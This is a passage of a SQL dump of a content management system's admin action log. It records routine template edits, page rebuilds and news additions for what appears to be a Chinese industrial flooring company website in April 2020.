17:03:25','admin','EditNews','classid=15<br>id=61<br>title=地坪的服务范围',1000010000000061,'58209'),(124,'127.0.0.1','2020-04-15 17:03:40','admin','TDelFile_all','---',0,'58261'),(125,'127.0.0.1','2020-04-15 17:03:48','admin','EditNews','classid=15<br>id=60<br>title=工业地坪设计与基础要求及处理',1000010000000060,'58261'),(126,'127.0.0.1','2020-04-15 17:15:31','admin','EditTempvar','varid=1<br>var=header&amp;gid=1',0,'58946'),(127,'127.0.0.1','2020-04-15 17:15:45','admin','EditPublicTemp','gid=1',0,'58961'),(128,'127.0.0.1','2020-04-15 17:28:07','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'59582'),(129,'127.0.0.1','2020-04-15 17:32:06','admin','EditPublicTemp','gid=1',0,'59799'),(130,'127.0.0.1','2020-04-15 17:32:09','admin','ReIndex','---',0,'59799'),(131,'127.0.0.1','2020-04-15 17:37:10','admin','EditPublicTemp','gid=1',0,'60108'),(132,'127.0.0.1','2020-04-15 17:37:13','admin','ReIndex','---',0,'60108'),(133,'127.0.0.1','2020-04-15 17:42:11','admin','ReIndex','---',0,'60362'),(134,'127.0.0.1','2020-04-16 10:11:25','admin','login','---',0,'62001'),(135,'127.0.0.1','2020-04-16 10:15:21','admin','EditPublicTemp','gid=1',0,'62336'),(136,'127.0.0.1','2020-04-16 10:15:25','admin','ReIndex','---',0,'62336'),(137,'127.0.0.1','2020-04-16 10:16:01','admin','EditPublicTemp','gid=1',0,'62370'),(138,'127.0.0.1','2020-04-16 10:16:21','admin','EditPublicTemp','gid=1',0,'62392'),(139,'127.0.0.1','2020-04-16 10:23:42','admin','EditPublicTemp','gid=1',0,'62968'),(140,'127.0.0.1','2020-04-16 10:23:46','admin','ReIndex','---',0,'62968'),(141,'127.0.0.1','2020-04-16 10:28:24','admin','EditPublicTemp','gid=1',0,'63129'),(142,'127.0.0.1','2020-04-16 10:28:27','admin','ReIndex','---',0,'63129'),(143,'127.0.0.1','2020-04-16 10:36:25','admin','EditPublicTemp','gid=1',0,'63423'),(144,'127.0.0.1','2020-04-16 10:36:43','admin','ReIndex','---',0,'63435'),(145,'127.0.0.1','2020-04-16 10:39:26','admin','EditPublicTemp','gid=1',0,'63537'),(146,'127.0.0.1','2020-04-16 10:39:28','admin','ReIndex','---',0,'63537'),(147,'127.0.0.1','2020-04-16 10:46:27','admin','EditPublicTemp','gid=1',0,'63757'),(148,'127.0.0.1','2020-04-16 10:50:21','admin','EditPublicTemp','gid=1',0,'63869'),(149,'127.0.0.1','2020-04-16 10:54:06','admin','EditPublicTemp','gid=1',0,'64040'),(150,'127.0.0.1','2020-04-16 10:54:08','admin','ReIndex','---',0,'64040'),(151,'127.0.0.1','2020-04-16 10:55:31','admin','EditPublicTemp','gid=1',0,'64082'),(152,'127.0.0.1','2020-04-16 11:02:29','admin','DelNews','classid=20<br>id=2<br>title=荣誉资质',1000010000000002,'64333'),(153,'127.0.0.1','2020-04-16 11:03:32','admin','AddNews','classid=20<br>id=64<br>title=荣誉1',1000010000000064,'64367'),(154,'127.0.0.1','2020-04-16 11:03:52','admin','AddNews','classid=20<br>id=65<br>title=荣誉2',1000010000000065,'64403'),(155,'127.0.0.1','2020-04-16 11:04:12','admin','AddNews','classid=20<br>id=66<br>title=荣誉3',1000010000000066,'64416'),(156,'127.0.0.1','2020-04-16 11:04:27','admin','AddNews','classid=20<br>id=67<br>title=荣誉4',1000010000000067,'64432'),(157,'127.0.0.1','2020-04-16 11:04:45','admin','AddNews','classid=20<br>id=68<br>title=荣誉5',1000010000000068,'64451'),(158,'127.0.0.1','2020-04-16 11:05:01','admin','AddNews','classid=20<br>id=69<br>title=荣誉6',1000010000000069,'64462'),(159,'127.0.0.1','2020-04-16 11:05:57','admin','AddNews','classid=20<br>id=70<br>title=荣誉7',1000010000000070,'64502'),(160,'127.0.0.1','2020-04-16 11:06:17','admin','AddNews','classid=20<br>id=71<br>title=荣誉8',1000010000000071,'64521'),(161,'127.0.0.1','2020-04-16 11:06:36','admin','AddNews','classid=20<br>id=72<br>title=荣誉9',1000010000000072,'64539'),(162,'127.0.0.1','2020-04-16 11:08:17','admin','EditPublicTemp','gid=1',0,'64598'),(163,'127.0.0.1','2020-04-16 11:08:25','admin','ReIndex','---',0,'64606'),(164,'127.0.0.1','2020-04-16 11:08:54','admin','EditPublicTemp','gid=1',0,'64625'),(165,'127.0.0.1','2020-04-16 11:08:56','admin','ReIndex','---',0,'64625'),(166,'127.0.0.1','2020-04-16 11:10:11','admin','DelNews','classid=21<br>id=3<br>title=合作伙伴',1000010000000003,'64680'),(167,'127.0.0.1','2020-04-16 11:11:38','admin','AddNews','classid=21<br>id=73<br>title=华侨城',1000010000000073,'64735'),(168,'127.0.0.1','2020-04-16 11:12:01','admin','AddNews','classid=21<br>id=74<br>title=碧桂园',1000010000000074,'64755'),(169,'127.0.0.1','2020-04-16 11:12:19','admin','AddNews','classid=21<br>id=75<br>title=龙湖地产',1000010000000075,'64785'),(170,'127.0.0.1','2020-04-16 11:12:41','admin','AddNews','classid=21<br>id=76<br>title=新田集团',1000010000000076,'64814'),(171,'127.0.0.1','2020-04-16 11:13:03','admin','AddNews','classid=21<br>id=77<br>title=金科',1000010000000077,'64826'),(172,'127.0.0.1','2020-04-16 11:13:30','admin','AddNews','classid=21<br>id=78<br>title=置信地产',1000010000000078,'64861'),(173,'127.0.0.1','2020-04-16 11:14:04','admin','AddNews','classid=21<br>id=79<br>title=中铁置业',1000010000000079,'64878'),(174,'127.0.0.1','2020-04-16 11:14:25','admin','AddNews','classid=21<br>id=80<br>title=建业集团',1000010000000080,'64908'),(175,'127.0.0.1','2020-04-16 11:16:08','admin','EditPublicTemp','gid=1',0,'64961'),(176,'127.0.0.1','2020-04-16 11:16:10','admin','ReIndex','---',0,'64961'),(177,'127.0.0.1','2020-04-16 11:16:45','admin','EditPublicTemp','gid=1',0,'64985'),(178,'127.0.0.1','2020-04-16 11:16:50','admin','ReIndex','---',0,'64985'),(179,'127.0.0.1','2020-04-16 11:19:11','admin','EditPublicTemp','gid=1',0,'65120'),(180,'127.0.0.1','2020-04-16 11:19:12','admin','ReIndex','---',0,'65120'),(181,'127.0.0.1','2020-04-16 11:21:04','admin','EditPublicTemp','gid=1',0,'65190'),(182,'127.0.0.1','2020-04-16 11:22:11','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'65237'),(183,'127.0.0.1','2020-04-16 11:22:16','admin','ReIndex','---',0,'65237'),(184,'127.0.0.1','2020-04-16 11:43:25','admin','login','---',0,'50226'),(185,'127.0.0.1','2020-04-16 11:48:47','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'50451'),(186,'127.0.0.1','2020-04-16 11:49:04','admin','ReListHtml_all','---',0,'50462'),(187,'127.0.0.1','2020-04-16 11:49:56','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'50517'),(188,'127.0.0.1','2020-04-16 11:50:07','admin','ReListHtml_all','---',0,'50525'),(189,'127.0.0.1','2020-04-16 11:50:57','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'50559'),(190,'127.0.0.1','2020-04-16 11:51:00','admin','ReListHtml_all','---',0,'50559'),(191,'127.0.0.1','2020-04-16 11:57:55','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'50916'),(192,'127.0.0.1','2020-04-16 11:57:57','admin','ReListHtml_all','---',0,'50916'),(193,'127.0.0.1','2020-04-16 11:58:57','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'50968'),(194,'127.0.0.1','2020-04-16 12:02:04','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'51077'),(195,'127.0.0.1','2020-04-16 12:02:07','admin','ReListHtml_all','---',0,'51077'),(196,'127.0.0.1','2020-04-16 12:04:49','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'51210'),(197,'127.0.0.1','2020-04-16 12:05:01','admin','ReListHtml_all','---',0,'51229'),(198,'127.0.0.1','2020-04-16 12:05:56','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'51275'),(199,'127.0.0.1','2020-04-16 12:05:59','admin','ReListHtml_all','---',0,'51275'),(200,'127.0.0.1','2020-04-16 12:09:18','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'51426'),(201,'127.0.0.1','2020-04-16 12:09:21','admin','ReListHtml_all','---',0,'51426'),(202,'127.0.0.1','2020-04-16 12:11:07','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'51497'),(203,'127.0.0.1','2020-04-16 12:11:11','admin','ReListHtml_all','---',0,'51497'),(204,'127.0.0.1','2020-04-16 12:11:29','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'51520'),(205,'127.0.0.1','2020-04-16 12:11:33','admin','ReListHtml_all','---',0,'51520'),(206,'127.0.0.1','2020-04-16 12:11:49','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'51544'),(207,'127.0.0.1','2020-04-16 12:11:54','admin','ReListHtml_all','---',0,'51544'),(208,'127.0.0.1','2020-04-16 12:16:34','admin','EditBqtemp','tempid=1<br>tempname=子栏目导航标签模板&amp;gid=1',0,'51695'),(209,'127.0.0.1','2020-04-16 12:17:41','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'51727'),(210,'127.0.0.1','2020-04-16 12:17:45','admin','ReListHtml_all','---',0,'51727'),(211,'127.0.0.1','2020-04-16 12:30:08','admin','EditTempvar','varid=3<br>var=tel&amp;gid=1',0,'52101'),(212,'127.0.0.1','2020-04-16 12:30:24','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'52106'),(213,'127.0.0.1','2020-04-16 12:30:27','admin','ReListHtml_all','---',0,'52106'),(214,'127.0.0.1','2020-04-16 12:30:41','admin','ReIndex','---',0,'52129'),(215,'127.0.0.1','2020-04-16 12:31:57','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'52299'),(216,'127.0.0.1','2020-04-16 12:32:00','admin','ReListHtml_all','---',0,'52299'),(217,'127.0.0.1','2020-04-16 12:36:17','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'52439'),(218,'127.0.0.1','2020-04-16 12:36:22','admin','ReListHtml_all','---',0,'52439'),(219,'127.0.0.1','2020-04-16 12:36:57','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'52471'),(220,'127.0.0.1','2020-04-16 12:37:01','admin','ReListHtml_all','---',0,'52471'),(221,'127.0.0.1','2020-04-16 12:38:23','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'52536'),(222,'127.0.0.1','2020-04-16 12:38:25','admin','ReListHtml_all','---',0,'52536'),(223,'127.0.0.1','2020-04-16 12:40:21','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'52627'),(224,'127.0.0.1','2020-04-16 12:40:49','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'52651'),(225,'127.0.0.1','2020-04-16 12:40:53','admin','ReListHtml_all','---',0,'52651'),(226,'127.0.0.1','2020-04-16 12:43:07','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'52769'),(227,'127.0.0.1','2020-04-16 12:43:17','admin','ReListHtml_all','---',0,'52777'),(228,'127.0.0.1','2020-04-16 12:47:23','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'53005'),(229,'127.0.0.1','2020-04-16 12:47:28','admin','ReListHtml_all','---',0,'53005'),(230,'127.0.0.1','2020-04-16 12:48:50','admin','EditClass','classid=15<br>classname=企业资讯',0,'53087'),(231,'127.0.0.1','2020-04-16 12:48:56','admin','ReListHtml_all','---',0,'53087'),(232,'127.0.0.1','2020-04-16 12:50:32','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'53139'),(233,'127.0.0.1','2020-04-16 12:50:38','admin','ReListHtml_all','---',0,'53139'),(234,'127.0.0.1','2020-04-16 12:52:04','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'53226'),(235,'127.0.0.1','2020-04-16 12:53:14','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'53291'),(236,'127.0.0.1','2020-04-16 12:53:16','admin','ReListHtml_all','---',0,'53291'),(237,'127.0.0.1','2020-04-16 12:53:38','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'53322'),(238,'127.0.0.1','2020-04-16 12:53:41','admin','ReListHtml_all','---',0,'53322'),(239,'127.0.0.1','2020-04-16 12:54:24','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'53362'),(240,'127.0.0.1','2020-04-16 12:54:26','admin','ReListHtml_all','---',0,'53362'),(241,'127.0.0.1','2020-04-16 12:55:12','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'53390'),(242,'127.0.0.1','2020-04-16 13:46:56','admin','login','---',0,'54596'),(243,'127.0.0.1','2020-04-16 13:47:01','admin','ReListHtml_all','---',0,'54610'),(244,'127.0.0.1','2020-04-16 13:50:47','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'54752'),(245,'127.0.0.1','2020-04-16 13:50:50','admin','ReListHtml_all','---',0,'54752'),(246,'127.0.0.1','2020-04-16 13:51:12','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'54779'),(247,'127.0.0.1','2020-04-16 13:51:18','admin','ReListHtml_all','---',0,'54786'),(248,'127.0.0.1','2020-04-16 13:52:49','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'54848'),(249,'127.0.0.1','2020-04-16 13:52:54','admin','ReListHtml_all','---',0,'54848'),(250,'127.0.0.1','2020-04-16 13:56:57','admin','EditPublicTemp','gid=1',0,'54993'),(251,'127.0.0.1','2020-04-16 13:57:01','admin','ReIndex','---',0,'54993'),(252,'127.0.0.1','2020-04-16 14:03:35','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'55199'),(253,'127.0.0.1','2020-04-16 14:03:41','admin','ReListHtml_all','---',0,'55199'),(254,'127.0.0.1','2020-04-16 14:05:15','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'55265'),(255,'127.0.0.1','2020-04-16 14:05:17','admin','ReListHtml_all','---',0,'55265'),(256,'127.0.0.1','2020-04-16 14:06:48','admin','EditBqtemp','tempid=1<br>tempname=子栏目导航标签模板&amp;gid=1',0,'55354'),(257,'127.0.0.1','2020-04-16 14:07:13','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'55378'),(258,'127.0.0.1','2020-04-16 14:08:05','admin','ReListHtml_all','---',0,'55408'),(259,'127.0.0.1','2020-04-16 14:10:14','admin','EditBqtemp','tempid=1<br>tempname=子栏目导航标签模板&amp;gid=1',0,'55481'),(260,'127.0.0.1','2020-04-16 14:10:18','admin','ReListHtml_all','---',0,'55481'),(261,'127.0.0.1','2020-04-16 14:12:12','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'55549'),(262,'127.0.0.1','2020-04-16 14:12:30','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'55566'),(263,'127.0.0.1','2020-04-16 14:12:36','admin','ReListHtml_all','---',0,'55566'),(264,'127.0.0.1','2020-04-16 14:13:17','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'55603'),(265,'127.0.0.1','2020-04-16 14:13:20','admin','ReListHtml_all','---',0,'55603'),(266,'127.0.0.1','2020-04-16 14:15:04','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'55661'),(267,'127.0.0.1','2020-04-16 14:15:10','admin','ReListHtml_all','---',0,'55661'),(268,'127.0.0.1','2020-04-16 14:15:47','admin','EditClass','classid=7<br>classname=功能性地坪',0,'55698'),(269,'127.0.0.1','2020-04-16 14:16:07','admin','SetMoreClass','---',0,'55711'),(270,'127.0.0.1','2020-04-16 14:16:10','admin','ReListHtml_all','---',0,'55711'),(271,'127.0.0.1','2020-04-16 14:16:45','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'55742'),(272,'127.0.0.1','2020-04-16 14:16:49','admin','ReListHtml_all','---',0,'55742'),(273,'127.0.0.1','2020-04-16 14:20:04','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'55895'),(274,'127.0.0.1','2020-04-16 14:20:57','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'55943'),(275,'127.0.0.1','2020-04-16 14:22:14','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'55996'),(276,'127.0.0.1','2020-04-16 14:25:03','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'56091'),(277,'127.0.0.1','2020-04-16 14:33:05','admin','EditNewstemp','tempid=1<br>tempname=新闻内容模板&amp;gid=1',0,'56337'),(278,'127.0.0.1','2020-04-16 14:34:47','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'64405'),(279,'127.0.0.1','2020-04-16 14:35:01','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'64405'),(280,'127.0.0.1','2020-04-16 14:35:14','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'64405'),(281,'127.0.0.1','2020-04-16 14:35:52','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'64456'),(282,'127.0.0.1','2020-04-16 14:36:08','admin','EditClass','classid=4<br>classname=工程案例',0,'64467'),(283,'127.0.0.1','2020-04-16 14:36:18','admin','ReListHtml_all','---',0,'64467'),(284,'127.0.0.1','2020-04-16 14:36:50','admin','EditClass','classid=4<br>classname=工程案例',0,'64507'),(285,'127.0.0.1','2020-04-16 14:37:04','admin','EditClass','classid=18<br>classname=最新案例',0,'64507'),(286,'127.0.0.1','2020-04-16 14:37:13','admin','EditClass','classid=19<br>classname=经典案例',0,'64507'),(287,'127.0.0.1','2020-04-16 14:37:19','admin','ReListHtml_all','---',0,'64507'),(288,'127.0.0.1','2020-04-16 14:39:02','admin','EditClass','classid=18<br>classname=最新案例',0,'64594'),(289,'127.0.0.1','2020-04-16 14:39:11','admin','EditClass','classid=19<br>classname=经典案例',0,'64594'),(290,'127.0.0.1','2020-04-16 14:39:20','admin','ReListHtml_all','---',0,'64594'),(291,'127.0.0.1','2020-04-16 14:40:40','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'64680'),(292,'127.0.0.1','2020-04-16 14:40:43','admin','ReListHtml_all','---',0,'64680'),(293,'127.0.0.1','2020-04-16 14:53:03','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'65338'),(294,'127.0.0.1','2020-04-16 14:53:07','admin','ReListHtml_all','---',0,'65338'),(295,'127.0.0.1','2020-04-16 14:55:06','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'65429'),(296,'127.0.0.1','2020-04-16 14:55:12','admin','ReListHtml_all','---',0,'65429'),(297,'127.0.0.1','2020-04-16 14:55:41','admin','EditListtemp','tempid=3<br>tempname=案例列表模板&amp;gid=1',0,'65463'),(298,'127.0.0.1','2020-04-16 14:55:44','admin','ReListHtml_all','---',0,'65463'),(299,'127.0.0.1','2020-04-16 15:00:44','admin','EditNewstemp','tempid=3<br>tempname=通用单页&amp;gid=1',0,'49232'),(300,'127.0.0.1','2020-04-16 15:01:25','admin','EditClass','classid=2<br>classname=关于我们',0,'49280'),(301,'127.0.0.1','2020-04-16 15:01:38','admin','EditClass','classid=13<br>classname=企业文化',0,'49293'),(302,'127.0.0.1','2020-04-16 15:01:57','admin','EditNews','classid=12<br>id=1<br>title=公司简介',1000010000000001,'49305'),(303,'127.0.0.1','2020-04-16 15:02:23','admin','EditNewstemp','tempid=3<br>tempname=通用单页&amp;gid=1',0,'49331'),(304,'127.0.0.1','2020-04-16 15:03:16','admin','EditClass','classid=12<br>classname=公司简介',0,'49377'),(305,'127.0.0.1','2020-04-16 15:07:30','admin','ReListHtml','---',0,'49716'),(306,'127.0.0.1','2020-04-16 15:07:34','admin','ReListHtml','---',0,'49716'),(307,'127.0.0.1','2020-04-16 15:07:37','admin','ReListHtml','---',0,'49716'),(308,'127.0.0.1','2020-04-16 15:07:40','admin','ReListHtml','---',0,'49716'),(309,'127.0.0.1','2020-04-16 15:08:51','admin','ReListHtml','---',0,'49769'),(310,'127.0.0.1','2020-04-16 15:09:35','admin','EditClass','classid=6<br>classname=联系我们',0,'49806'),(311,'127.0.0.1','2020-04-16 15:09:45','admin','EditNews','classid=6<br>id=4<br>title=联系我们',1000010000000004,'49806'),(312,'127.0.0.1','2020-04-16 15:09:49','admin','ReListHtml_all','---',0,'49806'),(313,'127.0.0.1','2020-04-16 15:10:26','admin','EditNewstemp','tempid=3<br>tempname=通用单页&amp;gid=1',0,'49861'),(314,'127.0.0.1','2020-04-16 15:10:57','admin','EditNewstemp','tempid=3<br>tempname=通用单页&amp;gid=1',0,'49876'),(315,'127.0.0.1','2020-04-16 15:11:05','admin','ReListHtml_all','---',0,'49884'),(316,'127.0.0.1','2020-04-16 15:11:06','admin','ReIndex','---',0,'49884'),(317,'127.0.0.1','2020-04-16 15:11:27','admin','EditClass','classid=6<br>classname=联系我们',0,'49905'),(318,'127.0.0.1','2020-04-16 15:11:29','admin','ReListHtml_all','---',0,'49905'),(319,'127.0.0.1','2020-04-16 15:11:58','admin','EditClass','classid=6<br>classname=联系我们',0,'49947'),(320,'127.0.0.1','2020-04-16 15:12:04','admin','ReListHtml_all','---',0,'49947'),(321,'127.0.0.1','2020-04-16 15:12:09','admin','ReIndex','---',0,'49961'),(322,'127.0.0.1','2020-04-16 15:12:38','admin','EditClass','classid=6<br>classname=联系我们',0,'49993'),(323,'127.0.0.1','2020-04-16 15:12:49','admin','EditNews','classid=6<br>id=4<br>title=联系我们',1000010000000004,'49993'),(324,'127.0.0.1','2020-04-16 15:13:37','admin','EditClass','classid=12<br>classname=公司简介',0,'50039'),(325,'127.0.0.1','2020-04-16 15:14:10','admin','EditClass','classid=12<br>classname=公司简介',0,'50078'),(326,'127.0.0.1','2020-04-16 15:14:17','admin','ReListHtml_all','---',0,'50086'),(327,'127.0.0.1','2020-04-16 15:14:53','admin','EditClass','classid=12<br>classname=公司简介',0,'50128'),(328,'127.0.0.1','2020-04-16 15:14:56','admin','ReListHtml_all','---',0,'50128'),(329,'127.0.0.1','2020-04-16 15:15:18','admin','login','---',0,'50169'),(330,'127.0.0.1','2020-04-16 15:15:53','admin','AddNews','classid=13<br>id=81<br>title=企业文化',1000010000000081,'50233'),(331,'127.0.0.1','2020-04-16 15:16:17','admin','EditClass','classid=13<br>classname=企业文化',0,'50252'),(332,'127.0.0.1','2020-04-16 15:16:21','admin','ReListHtml_all','---',0,'50252'),(333,'127.0.0.1','2020-04-16 15:17:12','admin','EditClass','classid=13<br>classname=企业文化',0,'50322'),(334,'127.0.0.1','2020-04-16 15:17:15','admin','ReListHtml_all','---',0,'50322'),(335,'127.0.0.1','2020-04-16 15:17:47','admin','EditClass','classid=2<br>classname=关于我们',0,'50363'),(336,'127.0.0.1','2020-04-16 15:17:55','admin','EditClass','classid=2<br>classname=关于我们',0,'50363'),(337,'127.0.0.1','2020-04-16 15:18:14','admin','EditClass','classid=12<br>classname=公司简介',0,'50387'),(338,'127.0.0.1','2020-04-16 15:18:25','admin','EditNews','classid=13<br>id=81<br>title=企业文化',1000010000000081,'50402'),(339,'127.0.0.1','2020-04-16 15:18:38','admin','ReListHtml_all','---',0,'50415'),(340,'127.0.0.1','2020-04-16 15:18:44','admin','ReIndex','---',0,'50415'),(341,'127.0.0.1','2020-04-16 15:25:06','admin','EditClass','classid=2<br>classname=关于我们',0,'50714'),(342,'127.0.0.1','2020-04-16 15:25:34','admin','EditClass','classid=12<br>classname=公司简介',0,'50737'),(343,'127.0.0.1','2020-04-16 15:26:13','admin','ChangeEnewsData','---',0,'50768'),(344,'127.0.0.1','2020-04-16 15:26:33','admin','UpdateClassInfosAll','---',0,'50789'),(345,'127.0.0.1','2020-04-16 15:29:30','admin','EditClass','classid=2<br>classname=关于我们',0,'50955'),(346,'127.0.0.1','2020-04-16 15:31:23','admin','login','---',0,'51042'),(347,'127.0.0.1','2020-04-16 15:31:42','admin','EditClass','classid=2<br>classname=关于我们',0,'51066'),(348,'127.0.0.1','2020-04-16 15:31:47','admin','ReListHtml_all','---',0,'51066'),(349,'127.0.0.1','2020-04-16 15:31:51','admin','ReIndex','---',0,'51066'),(350,'127.0.0.1','2020-04-16 15:32:38','admin','EditClass','classid=3<br>classname=新闻资讯',0,'51117'),(351,'127.0.0.1','2020-04-16 15:32:49','admin','ReListHtml_all','---',0,'51122'),(352,'127.0.0.1','2020-04-16 15:33:41','admin','EditClass','classid=12<br>classname=公司简介',0,'51176'),(353,'127.0.0.1','2020-04-16 15:33:46','admin','ReListHtml_all','---',0,'51176'),(354,'127.0.0.1','2020-04-16 15:34:17','admin','EditClass','classid=12<br>classname=公司简介',0,'51214'),(355,'127.0.0.1','2020-04-16 15:35:35','admin','EditNewstemp','tempid=3<br>tempname=通用单页&amp;gid=1',0,'51262'),(356,'127.0.0.1','2020-04-16 15:36:11','admin','EditClass','classid=12<br>classname=公司简介',0,'51292'),(357,'127.0.0.1','2020-04-16 15:37:47','admin','EditClass','classid=12<br>classname=公司简介',0,'51360'),(358,'127.0.0.1','2020-04-16 15:39:27','admin','EditNews','classid=12<br>id=1<br>title=公司简介',1000010000000001,'51429'),(359,'127.0.0.1','2020-04-16 15:39:31','admin','ReSingleInfo','classid=12',0,'51429'),(360,'127.0.0.1','2020-04-16 15:41:08','admin','EditClass','classid=14<br>classname=公司风采',0,'51519'),(361,'127.0.0.1','2020-04-16 15:41:32','admin','AddNews','classid=14<br>id=82<br>title=公司风采',1000010000000082,'51557'),(362,'127.0.0.1','2020-04-16 15:41:42','admin','ReSingleInfo','classid=14',0,'51557'),(363,'127.0.0.1','2020-04-16 15:42:06','admin','ReSingleInfo','classid=6',0,'51584'),(364,'127.0.0.1','2020-04-16 15:43:31','admin','EditClass','classid=1<br>classname=产品中心',0,'51654'),(365,'127.0.0.1','2020-04-16 15:43:42','admin','ReListHtml','---',0,'51669'),(366,'127.0.0.1','2020-04-16 15:45:23','admin','EditClass','classid=3<br>classname=新闻资讯',0,'51729'),(367,'127.0.0.1','2020-04-16 15:45:43','admin','EditClass','classid=4<br>classname=工程案例',0,'51743'),(368,'127.0.0.1','2020-04-16 15:46:18','admin','EditClass','classid=5<br>classname=公司实力',0,'51765'),(369,'127.0.0.1','2020-04-16 15:46:46','admin','ReListHtml_all','---',0,'51780'),(370,'127.0.0.1','2020-04-16 15:46:48','admin','ReIndex','---',0,'51780'),(371,'127.0.0.1','2020-04-16 15:47:12','admin','EditClass','classid=5<br>classname=公司实力',0,'51815'),(372,'127.0.0.1','2020-04-16 15:47:20','admin','EditClass','classid=4<br>classname=工程案例',0,'51815'),(373,'127.0.0.1','2020-04-16 15:47:47','admin','ReListHtml_all','---',0,'51856'),(374,'127.0.0.1','2020-04-16 15:47:48','admin','ReIndex','---',0,'51856'),(375,'127.0.0.1','2020-04-16 15:48:23','admin','EditClass','classid=20<br>classname=荣誉资质',0,'51900'),(376,'127.0.0.1','2020-04-16 15:49:09','admin','EditClass','classid=20<br>classname=荣誉资质',0,'51925'),(377,'127.0.0.1','2020-04-16 15:50:34','admin','EditTempvar','varid=1<br>var=header&amp;gid=1',0,'51992'),(378,'127.0.0.1','2020-04-16 15:50:45','admin','ReListHtml_all','---',0,'51992'),(379,'127.0.0.1','2020-04-16 15:50:46','admin','ReIndex','---',0,'51992'),(380,'127.0.0.1','2020-04-16 15:51:26','admin','EditClass','classid=20<br>classname=荣誉资质',0,'52042'),(381,'127.0.0.1','2020-04-16 15:51:41','admin','EditNews','classid=20<br>id=72<br>title=荣誉9',1000010000000072,'52059'),(382,'127.0.0.1','2020-04-16 15:51:50','admin','EditNews','classid=20<br>id=71<br>title=荣誉8',1000010000000071,'52059'),(383,'127.0.0.1','2020-04-16 15:51:57','admin','EditNews','classid=20<br>id=70<br>title=荣誉7',1000010000000070,'52059'),(384,'127.0.0.1','2020-04-16 15:52:05','admin','EditNews','classid=20<br>id=69<br>title=荣誉6',1000010000000069,'52059'),(385,'127.0.0.1','2020-04-16 15:52:14','admin','EditNews','classid=20<br>id=68<br>title=荣誉5',1000010000000068,'52059'),(386,'127.0.0.1','2020-04-16 15:52:26','admin','EditNews','classid=20<br>id=67<br>title=荣誉4',1000010000000067,'52059'),(387,'127.0.0.1','2020-04-16 15:52:34','admin','EditNews','classid=20<br>id=66<br>title=荣誉3',1000010000000066,'52059'),(388,'127.0.0.1','2020-04-16 15:52:41','admin','EditNews','classid=20<br>id=65<br>title=荣誉2',1000010000000065,'52059'),(389,'127.0.0.1','2020-04-16 15:52:48','admin','EditNews','classid=20<br>id=64<br>title=荣誉1',1000010000000064,'52059'),(390,'127.0.0.1','2020-04-16 15:52:54','admin','ReListHtml_all','---',0,'52059'),(391,'127.0.0.1','2020-04-16 15:52:55','admin','ReIndex','---',0,'52059'),(392,'127.0.0.1','2020-04-16 